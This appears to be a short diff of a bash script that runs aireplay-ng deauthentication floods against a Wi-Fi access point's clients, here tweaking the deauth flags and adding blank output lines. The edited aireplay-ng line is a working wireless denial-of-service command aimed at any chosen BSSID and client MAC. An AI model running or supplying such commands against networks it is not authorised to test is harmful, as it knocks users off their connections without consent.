@@ -15,7 +15,7 @@ echo ""
 elif [[ $mac = "MAC" ]]; then
 echo ""
 else
-sudo xterm -e aireplay-ng -D --deauth 50 -a $MYBSSID -c $mac $mon0 &
+sudo xterm -e aireplay-ng --ignore-negative-one -D --deauth 40 --deauth-rc 7 -a $MYBSSID -c $mac $mon0 &
 fi
 done
     }
@@ -28,6 +28,7 @@ echo "To gather the info about your 5GHz AP/router:"
 echo
 sleep 3
 echo "enp=Ethernet wl=wireless lo=Loopback"
+echo
 select wifi in $(ls /sys/class/net); do
 mon=$wifi
 read -p "Use $wifi:? [y/n] "
@@ -71,6 +72,7 @@ PID=$!
 echo
 until [[ $INFO2 = [yY]* ]]; do
 echo "Deauthenticate your wifi network for:"
+echo
 read -p "[H]ours or [M]inutes?: "
 echo
 clear
